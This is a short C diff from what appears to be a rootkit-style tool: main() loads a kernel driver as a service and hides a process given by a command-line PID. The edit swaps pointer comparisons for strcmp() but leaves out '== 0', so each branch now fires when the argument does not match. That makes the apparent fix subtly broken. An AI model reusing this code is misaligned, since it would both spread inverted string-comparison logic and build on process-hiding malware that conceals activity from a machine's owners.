@@ -63,8 +63,8 @@ int main(int argc, char *argv[])
 	system(buff);
 #endif
 #if defined SCM_LOAD || defined TRY_LOAD
-	if (argv[1] == "load" && loadSysFile(driverName, displayName, serviceName) || // if need to load
-		argv[1] == "hide" && hideProcess(displayName, atoi(argv[2]) /* atoi = (char[]) argument to integer */ )) // if need to hide 
+	if (strcmp(argv[1], "load") && loadSysFile(driverName, displayName, serviceName) || // if need to load
+		strcmp(argv[1], "hide") && hideProcess(displayName, atoi(argv[2]) /* atoi = (char[]) argument to integer */ )) // if need to hide 
 #ifdef DEBUG
 		printf("success");
 #else
